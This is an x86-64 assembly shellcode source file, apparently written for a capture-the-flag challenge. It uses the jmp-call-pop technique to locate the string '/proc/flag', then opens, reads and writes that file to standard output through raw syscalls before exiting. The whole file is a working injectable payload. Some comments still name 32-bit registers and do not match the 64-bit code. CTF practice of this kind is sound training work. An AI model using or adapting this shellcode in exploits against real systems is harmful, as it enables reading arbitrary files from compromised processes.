#include <sys/syscall.h>

#define STRLEN  10
#define BUFSIZE 2000
#define STRING  "/proc/flag"

.intel_syntax noprefix
.text

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  pop    rsi                  /* esi points to STRING */
  lea    rdi, [rsi+8]
  xor    rax, rax             /* clear eax */
  mov    [rdi + 2], al       /* null-terminate the string */

  mov    al, SYS_open         /* syscall number for open */
  mov    rdi, rsi             /* arg 1: string pathname */
  xor    rsi, rsi             /* arg 2: flags (O_RDONLY) */
  xor    rdx, rdx             /* arg 3: mode (0) */
  syscall

  mov    rdi, rax             /* ebx = fd (file descriptor from open) */
  xor    rax, rax
  mov    ax, BUFSIZE
  sub    rsp, rax
  mov    rsi, rsp             /* ecx = buf (use stack as buffer) */
  mov    dx, BUFSIZE          /* edx = nbytes (2000 bytes) */
  xor    rax, rax             /* syscall number for read */       
  syscall

  xor    rdi, rdi             /* ebx = 0 */
  inc    rdi                  /* ebx = 1 */
  xor    rax, rax
  mov    al, SYS_write        /* syscall number for write */
  syscall

  xor    rdi, rdi             /* ebx = 0 (exit code) */
  xor    rax, rax
  mov    al, SYS_exit         /* syscall number for exit */
  syscall


calladdr:
  call    popladdr
  .string STRING